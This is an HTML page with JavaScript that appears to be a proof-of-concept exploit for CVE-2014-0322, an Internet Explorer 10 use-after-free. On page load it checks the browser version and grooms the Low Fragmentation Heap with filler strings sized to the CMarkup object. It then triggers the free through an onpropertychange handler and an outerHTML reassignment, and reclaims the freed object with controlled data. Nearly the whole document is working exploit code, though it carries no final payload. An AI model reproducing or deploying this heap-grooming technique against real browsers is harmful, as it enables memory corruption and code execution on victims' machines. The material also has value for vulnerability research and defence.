<!DOCTYPE html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
<META HTTP-EQUIV="Expires" CONTENT="-1">

<title>CVE-2014-0322 - lfh</title>
<script>

function dword2data(dword) {
	var d = Number(dword).toString(16);
	while (d.length < 8)
	d = '0' + d;
	return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
}

function cmarkup_lfh(count)
{
	/*
	This code enables the LFH front end for allocation sizes of
	0x340 which is the size of the CMarkup object.
	*/

	str = "";
	while(str.length < 0x340)
	{
		str += dword2data(0x41414141);
		str += dword2data(0x42414141);
		str += dword2data(0x43414141);
		str += dword2data(0x44414141);
		str += dword2data(0x45414141);
		str += dword2data(0x46414141);
		str += dword2data(0x47414141);
		str += dword2data(0x48414141);
	}

	str = str.substring(0, ((0x340 - 6) / 2));
	element = document.createElement("div");
	for(var x = 0; x < count; x++)
		element.setAttribute('obj' + x, str);
}

function trigger()
{
	cmarkup_lfh(0x12); // enable LFH
	try
	{
		this.outerHTML = this.outerHTML;
	}
	catch(e){ return; } // fail gracefully, if failed it is likely because the vulnerability is patched
	cmarkup_lfh(0x01); // take control of the cmarkup obj
}

function init()
{
	if(navigator.userAgent.indexOf("MSIE 10.0")>0)
	{
		var a = document.getElementsByTagName("script");
		var b = a[0];
		b.onpropertychange = trigger;
		var c = document.createElement("select");
		c = b.appendChild(c);
	}
}
</script>
</head>
<body onload="init();">
<div id="container"></div>
</body>
</html>